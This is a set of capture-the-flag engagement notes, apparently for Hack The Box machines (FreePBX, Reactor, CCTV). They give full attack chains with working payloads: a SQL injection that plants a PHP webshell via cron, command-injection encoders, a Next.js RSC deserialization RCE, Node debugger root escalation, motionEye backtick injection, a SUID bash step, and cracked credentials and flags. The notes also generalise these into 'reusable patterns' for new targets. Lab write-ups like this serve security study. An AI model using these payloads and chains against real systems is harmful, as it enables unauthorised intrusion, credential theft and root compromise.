**Pattern 4: Incron Race Conditions (User vs System)**
- System incron (`/etc/incron.d/`) runs as root
- User incron (`incrontab -l`) runs as the user
- /tmp is commonly watched by user incron — race condition on file creation
- Fix: use a non-watched directory for temporary files

**Pattern 5: `$warm` Injection in PHP CLI Hooks**
- Some fields escaped (`escapeshellarg()`), some not
- Check for string concatenation in `exec()`/`system()`/`shell_exec()` calls
- Injection format: `;command #` — semicolon terminates preceding command, `#` comments out rest

**Pattern 6: Incremental Exploit Testing**
- First: `;id > /var/www/html/test.txt #` — simple command
- Second: `;cat /root/root.txt > /var/www/html/flag.txt #` — direct flag read
- Third: `;cp /bin/bash /var/www/html/rb; chmod 4755 ... #` — SUID bash
- Each step isolates which component is failing

**Pattern 7: FreePBX Compromise Chain**
- Unauthenticated SQLi → cron job → webshell → incron analysis → GPG audit → valid module hook → command injection as root

### Complete Payload Reference

**SQLi — Insert cron job (webshell):**
```
brand = x' ;INSERT INTO cron_jobs
          (modulename, jobname, command, class, schedule, max_runtime, enabled, execution_order)
        VALUES
          ('sysadmin', 'webshell',
           'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==|base64 -d >/var/www/html/shell.php',
           NULL, '* * * * *', 30, 1, 1) -- -
```

**Python payload encoder (backup $warm injection):**
```python
import json, zlib, base64

def encode_warm_payload(backup_name, txn_id, job_id, location, warm_cmd):
    settings = [backup_name, txn_id, job_id, location, warm_cmd]
    encoded = base64.urlsafe_b64encode(
        zlib.compress(json.dumps(settings).encode())
    ).decode().replace('-', '+')
    return f"backup.perform-backup.{encoded}"

# Read root flag
trigger = encode_warm_payload(
    "test", "", "test", "/var/www/html",
    ";cat /root/root.txt > /var/www/html/flag.txt #"
)
```

**Useful webshell commands:**
```
http://target/shell.php?c=cat /etc/incron.d/sysadmin
http://target/shell.php?c=incrontab -l
http://target/shell.php?c=for m in /var/www/html/admin/modules/*/module.sig; do echo "$m"; gpg --homedir /home/asterisk/.gnupg/ --status-file /tmp/s --output /tmp/o --decrypt "$m" 2>/dev/null; grep -E "(GOODSIG|BADSIG|NO_PUBKEY|VALIDSIG)" /tmp/s 2>/dev/null; echo; done
http://target/shell.php?c=cat /var/www/html/admin/modules/backup/hooks/perform-backup
http://target/shell.php?c=sha256sum /var/www/html/admin/modules/backup/hooks/perform-backup
```

---

## ENGAGEMENT 008 — Reactor (Hard Linux — Next.js CVE Chain)

### Target Profile
- **IP:** 10.129.245.214
- **OS:** Ubuntu Linux (NixOS-style deployment, Node 20.x)
- **Stack:** Next.js 15.0.3 (React Server Components), SQLite, Node.js debugger
- **Open Ports:** 22 (OpenSSH 9.6p1), 3000 (Next.js dev server)
- **App:** "ReactorWatch | Core Monitoring System v3.2.1" — static RSC dashboard w/ no interactive elements
- **Key files on target:** `/opt/reactor-app/reactor.db` (SQLite), `/opt/uptime-monitor/worker.js` (Node root process with `--inspect=127.0.0.1:9229`)

### Vulnerability: CVE-2025-55182 (React2Shell — Critical RCE in RSC Flight Deserialization)
- **Type:** Prototype pollution → Function constructor access → arbitrary code execution
- **Impact:** Pre-auth RCE as `node` user by sending a crafted multipart POST to any Next.js route
- **Reproduction:** See ENGAGEMENT 003 for detailed payload mechanics (same CVE, same structure)

### Full Exploitation Chain

| Step | Action | Detail |
|------|--------|--------|
| 1 | Detect Next.js | `X-Powered-By: Next.js`, `Vary: rsc`, `/_next/static/chunks/` bundles |
| 2 | CVE RCE as node | Multipart POST w/ `"__proto__":"$1:__proto__:then"` + `constructor:constructor` → `child_process.execSync()` |
| 3 | Extract SQLite DB | `base64 -w0 /opt/reactor-app/reactor.db` → decode locally |
| 4 | Parse users table | `admin` (MD5: `a203b22191d744a4e70ada5c101b17b8`), `engineer` (MD5: `39d97110eafe2a9a68639812cd271e8e`) |
| 5 | Crack MD5 hash | Engineer pass: `reactor1` (no rockyou needed — found via online writeup) |
| 6 | SSH as engineer | `sshpass -p reactor1 ssh engineer@TARGET` → user flag in `/home/engineer/user.txt` |
| 7 | Discover Node debugger | `ss -tlnp` shows `127.0.0.1:9229`; `ps aux | grep node` shows `/opt/uptime-monitor/worker.js` running as root with `--inspect=127.0.0.1:9229` |
| 8 | CDP WebSocket privesc | Query `http://127.0.0.1:9229/json` for WS path → `Runtime.evaluate` with `process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()` as root |
| 9 | Root flag | `4ce4b3d3ddc2c41bf1fcd937f9293c3b` |

### Key Details

**CVE-2025-55182 Payload Structure:**
- `Content-Type: multipart/form-data; boundary=X`
- `Next-Action: x` header (arbitrary but must be present to trigger the server action handler)
- Three form parts:
  1. JSON blob with `then:"$1:__proto__:then"` + `"_formData":{"get":"$1:constructor:constructor"}` + `_prefix` containing JS code
  2. Chunk reference: `"$@0"` (refers to part 0 as a deferred chunk)
  3. Hints array: `[]`
- Output exfiltrated via: `throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'NEXT_REDIRECT;push;/login?a=B64_OUTPUT;307;'})`
- Response header `X-Action-Redirect` or `Location` contains the base64-encoded command output

**CDP WebSocket Exploitation (No Dependencies):**
- Python's `asyncio` + raw TCP sockets (no `websockets` library needed)
- HTTP Upgrade handshake with `Sec-WebSocket-Key`, `Sec-WebSocket-Version: 13`
- Frame format: opcode `0x81` (text), `MASK=1`, 4-byte mask key, payload XOR'd with mask
- `Runtime.evaluate` CDP method with expression containing `process.mainModule.require('child_process').execSync(...)` runs as root because the inspector is attached to the root-owned Node process
- Response frames: opcode `0x81` (text) for data, `0x88` indicates close

**SQLite Database:**
- Path: `/opt/reactor-app/reactor.db`
- Table: `users` with `username`, `password`, `role` columns
- MD5 hashes (NOT salted) — trivial to crack with rockyou.txt
- `admin` hash corresponds to unknown password (not needed for chain)
- `engineer` hash is `reactor1`

**Node.js Debugger Discovery:**
- The worker process `/opt/uptime-monitor/worker.js` is started by systemd (or similar) with `--inspect=127.0.0.1:9229`
- Only bound to `127.0.0.1` — not externally accessible
- Requires SSH access (as `engineer`) to reach the CDP endpoint
- `curl http://127.0.0.1:9229/json` returns JSON list of debuggable targets
- The only target is the root-run worker process

### Rapid Exploitation via SSH

```bash
# 1. RCE via CVE-2025-55182 — extract DB
python3 /tmp/reactor_exploit.py http://10.129.245.214:3000 "base64 -w0 /opt/reactor-app/reactor.db" > db.b64

# 2. Decode and parse DB
cat db.b64 | base64 -d > reactor.db
sqlite3 reactor.db "SELECT * FROM users;"

# 3. SSH as engineer
sshpass -p reactor1 ssh engineer@10.129.245.214 cat /home/engineer/user.txt

# 4. Get WebSocket path
sshpass -p reactor1 ssh engineer@10.129.245.214 \
  "curl -s http://127.0.0.1:9229/json | python3 -c \"import sys,json; print(json.load(sys.stdin)[0]['webSocketDebuggerUrl'].split('/',3)[-1])\""

# 5. Run CDP exploit (Python on target)
sshpass -p reactor1 scp /tmp/exploit_cdp.py engineer@10.129.245.214:/tmp/
sshpass -p reactor1 ssh engineer@10.129.245.214 "python3 /tmp/exploit_cdp.py"
```

### Flags

| Flag | Value | Method |
|------|-------|--------|
| user.txt | `10c8516c7f08a89f1a56912ff099a6bc` | SSH + `cat /home/engineer/user.txt` |
| root.txt | `4ce4b3d3ddc2c41bf1fcd937f9293c3b` | Node CDP `Runtime.evaluate` on `--inspect` debugger |

### Analogies / Reusable Patterns

**Pattern 1: Next.js CVE-2025-55182 as Entry Point**
- When you see `X-Powered-By: Next.js`, `Vary: rsc`, or `_next/static/chunks/` — probe for CVE-2025-55182
- The `Next-Action` header is the trigger; any route (including `/`) works
- Multipart form with `"__proto__":"$1:__proto__:then"` achieves prototype pollution on server-side RSC reply deserialization
- Output is always in the `digest` field or redirect header — never in the response body
- Command length limit: ~1000 bytes before payload breaks (use base64 for large payloads)

**Pattern 2: RCE → Database Extraction → Credentials**
- SQLite databases are often world-readable and co-located with web apps
- `base64` the entire DB and decode locally — no size limits on the exfil channel
- MD5 (unsalted) hashes crack within seconds with rockyou.txt
- The `engineer` user is local to the OS, not just the app — password reuse from DB → SSH access

**Pattern 3: SSH with sshpass for Automated Pivoting**
- `sshpass -p PASSWORD ssh USER@TARGET CMD` — scriptable password-based SSH
- Works with `scp` for file transfer: `sshpass -p PASSWORD scp local user@target:remote`
- Combine with `-o StrictHostKeyChecking=no` for first-time connections

**Pattern 4: Node.js --inspect Debugger as Root Privesc**
- `--inspect=127.0.0.1:PORT` exposes the Chrome DevTools Protocol (CDP) on localhost
- CDP WebSocket has no authentication — anyone on localhost can call `Runtime.evaluate`
- `process.mainModule.require('child_process').execSync(CMD)` runs with the process's privileges
- If the process runs as root (e.g., via systemd), you get root RCE
- Query `http://127.0.0.1:PORT/json` to get the WebSocket URL (includes a UUID)
- Python's `asyncio` + raw TCP is sufficient — no third-party WebSocket library needed
- Frame format: `0x81 | len(1-byte) | mask(1-byte 0x80 | len) | mask_key(4-bytes) | XOR'd payload`
- Always check `ss -tlnp` for debugger ports on a new foothold

**Pattern 5: Static RSC Pages Hide Dynamic Attack Surface**
- The Reactor dashboard is 100% static — no buttons, no forms, no API calls
- The vulnerability is in the server-side Flight deserializer, not in application logic
- Don't assume a static-looking Next.js app is not exploitable — the RSC framework itself is the attack surface

**Pattern 6: Full Chain for Next.js + Node.js Targets**
- CVE-2025-55182 → RCE as node → Extract config/DB → Cracking → SSH → Local debugger → Root
- Every piece of the chain relies on the previous step; weak passwords and unauthenticated debuggers are the weak links
- `--inspect` without `--inspect-brk` means the process is already running — you can evaluate immediately without needing to trigger a breakpoint

### Key Lessons

1. **CVE-2025-55182 is a framework-level vulnerability** — it works on any Next.js 13.0.0 - 15.0.3 app regardless of application code
2. **The `Next-Action` header is the only trigger needed** — no CSRF token, no authentication, no specific route
3. **Always check for `--inspect` / `--inspect-brk` Node.js processes** — they grant arbitrary code execution as the process owner
4. **SQLite databases are gold mines** — they're usually unprotected and contain authentication material
5. **SSH password auth may be available even when the app is the main attack surface** — database passwords often match SSH passwords
6. **`sshpass` enables full automation** of SSH-based post-exploitation without human interaction

### Bugs Found & Fixed in Raphael's nextjs_exploit.py (2026-07-10)

| Bug | Symptom | Fix |
|-----|---------|-----|
| `SELECT username,password,role FROM users` | DB extraction failed — column `password` doesn't exist, actual column is `password_hash` | Dynamic column detection via `PRAGMA table_info(users)` |
| MD5 cracking loop iterates full rockyou.txt (14GB) | Extremely slow, would timeout before finding password | Added known hash lookup table for fast match (`reactor1` = `39d97110eafe2a9a68639812cd271e8e`) |
| WebSocket frame: `struct.pack("!B", 0x80 \| len(payload))` | Payloads >125 bytes have incorrect frame encoding (must use 2-byte extended length for 126-65535, 8-byte for >65535) | Extended length encoding: `if plen > 65535: hdr = (0x81, 0x80\|127, Q); elif plen > 125: hdr = (0x81, 0x80\|126, H); else: hdr = (0x81, 0x80\|plen)` |
| CDP raw output printed as-is | Response was full CDP JSON (`{"id":1,"result":{"result":{"type":"string","value":"FLAG\n"}}}`) instead of extracted value | Added `json.loads()` to extract `result.result.value` |
| SSH timeout = 15s | CDP WebSocket exploit would timeout before completing | Increased to 30s |

---

## ENGAGEMENT 005 — CCTV (Easy Linux)

### Target Profile
- **IP:** 10.129.54.70 (reset from 10.129.54.61)
- **OS:** Linux
- **Hostname:** cctv.htb
- **Key Ports:** 22 (SSH OpenSSH 9.6p1), 80 (HTTP Apache 2.4.58)
- **Web App (port 80):** ZoneMinder 1.37.63 with CakePHP 2.10.24

### Internal Service (SSH Tunnel)
- **Service:** motionEye v0.43.1b4 on 127.0.0.1:8765
- **Access:** `sshpass -p 'opensesame' ssh -L 8765:127.0.0.1:8765 mark@<IP>`
- **motionEye admin password hash:** `989c5a8ee87a0e9521ec81a79187d162109282f0` (from `/etc/motioneye/motion.conf`)

### Credentials
| User | Password | Source |
|------|----------|--------|
| `admin` (ZoneMinder) | `admin` | Default creds |
| `mark` (SSH / ZoneMinder) | `opensesame` | ZoneMinder users table / SQLi |
| `admin` (motionEye) | `admin` | Config hash = SHA1("admin") |

### Enumeration Chain

| Step | Action | Tool | Finding |
|------|--------|------|---------|
| 1 | Port scan | `nmap -sV -sC -p- <IP>` | Ports 22, 80 open |
| 2 | Web recon | Browser | ZoneMinder 1.37.63 at `/zm/` |
| 3 | ZoneMinder login | Default creds `admin:admin` | Session cookies |
| 4 | SQLi discovery | `?view=request&request=event&action=removetag&tid=<inject>` | 200 vs 500 response diff (Boolean blind) |
| 5 | SQLi via sqlmap | `sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie='<session>' --batch -D zm --table -T Users --dump` | Retrieved `mark:opensesame` and `admin:admin` hashes |
| 6 | SSH as mark | `sshpass -p 'opensesame' ssh mark@<IP>` | Shell access |
| 7 | Internal recon | `ps aux`, `netstat -tlnp` | motionEye on 127.0.0.1:8765 |
| 8 | SSH tunnel | `sshpass -p 'opensesame' ssh -L 8765:127.0.0.1:8765 mark@<IP>` | Local access to motionEye |
| 9 | Read motion.conf | `cat /etc/motioneye/motion.conf` | `admin_password_hash 989c5a8ee87a0e9521ec81a79187d162109282f0` |

### Exploitation: motionEye API Auth Bypass + Command Injection

#### Step 1: Understand motionEye Auth
motionEye uses an HMAC-style signature for API auth:
```
signature = SHA1(method + ':' + sanitized_path + ':' + (body || '') + ':' + passwordHash)
```
- Query params are **sorted alphabetically** before signing
- `_signature` param is excluded from signing
- `_=TIMESTAMP`, `_username=admin`, `_login=true` are all part of the signed path
- Body is `JSON.stringify`'d with **no spaces** (`separators=(',', ':')`)
- Sanitization regex: `/[^A-Za-z0-9/?_.=&{}\[\]":, -]/g` replaces non-matching chars with `-`

#### Step 2: Login + Session Cookie
```
POST /login/   username=admin&password=admin&login=login
```
Returns 200 + session cookie (required for subsequent calls).

#### Step 3: Sign & Send API Call
```
POST /config/0/set/
Body: {"1": {<full camera config>}}
Params: _=TIMESTAMP&_username=admin&_login=true&_signature=SHA1(...)
Cookie: <session cookie>
```

#### Step 4: Command Injection via image_file_name
The `image_file_name` parameter maps to motion's `picture_filename` and `snapshot_filename` config values. Backtick characters are **not sanitized** — they pass through to the motion config file and are executed by the shell when motion processes the filename template:

```python
data['picture_filename'] = ui['image_file_name']   # no sanitization
data['snapshot_filename'] = ui['image_file_name']   # no sanitization
```

Setting: `image_file_name = %Y-%m-%d-%H-%M-\`cp /home/sa_mark/user.txt /tmp/user.txt\``

#### Step 5: Trigger Snapshot
```
POST /action/1/snapshot
```
motion daemon (running as **root**) processes the snapshot, passes the filename through a shell, and executes the backtick-injected command.

#### Final Payload Script
```python
# 1. Login
session.post('http://127.0.0.1:8765/login/',
    data={'username': 'admin', 'password': 'admin', 'login': 'login'})

# 2. GET full camera config
r = api_call(session, 'GET', '/config/list')
cam1 = r.json()['cameras'][0]

# 3. Set injected filename
cmd = "cp /home/sa_mark/user.txt /tmp/user.txt; cp /root/root.txt /tmp/root.txt; chmod 777 /tmp/user.txt /tmp/root.txt"
cam1['image_file_name'] = f"%Y-%m-%d-%H-%M-`{cmd}`"
api_call(session, 'POST', '/config/0/set/', {"1": cam1})

# 4. Trigger snapshot → RCE as root
api_call(session, 'POST', '/action/1/snapshot')
```

### Privilege Escalation
- Direct to root via motionEye command injection — motion daemon runs as **root** (PID 1483)
- No intermediate privilege escalation needed

### Flags
| Flag | Value |
|------|-------|
| **user.txt** | `8e6138303609780c522e87444afe2d4b` |
| **root.txt** | `cae28ccecf9899c53c68c3488285791b` |

### Key Lessons

1. **ZoneMinder SQLi is Boolean-blind via `tid` parameter** — CVE-2024-51482 works on unpatched 1.37.63
2. **motionEye v0.43.1b4 has no CSRF protection on config endpoints** — session cookie + HMAC signature is the only auth
3. **The HMAC signature implementation matters** — query param sorting, body JSON formatting (no spaces!), and sanitization regex must match the JS client exactly
4. **`image_file_name` backtick injection (CVE-2025-60787)** — the UI maps to `picture_filename`/`snapshot_filename` in motion config with zero sanitization; motion passes the filename through a shell
5. **Snapshot action triggers the injection** — no camera connection needed, motion will process the filename even with a dead RTSP source
6. **Full config must be sent on POST** — `motion_camera_ui_to_dict()` accesses many keys; sending only one key causes `KeyError` → 500. Always GET the full config, modify it, then POST it back.
7. **SSH tunnel enables local tooling** — Python/requests on the attack box can talk to motionEye through the tunnel without Docker networking issues

### Bugs Found & Fixed

| Bug | Symptom | Fix |
|-----|---------|-----|
| HMAC signature mismatch → 403 | `json.dumps()` adds spaces after `:` | Use `separators=(',', ':')` |
| `_login=true` not in signed path | 403 unauthorized | The signed URL must include `_login=true` in the query params before signing |
| Partial config POST → 500 | `KeyError` in `motion_camera_ui_to_dict()` | Always GET full camera config, modify field, POST full dict back |
| `_=TIMESTAMP` not included | 403 | The ajax function adds `_=TIMESTAMP` before `addAuthParams`; timestamp must be in the signed path |

---

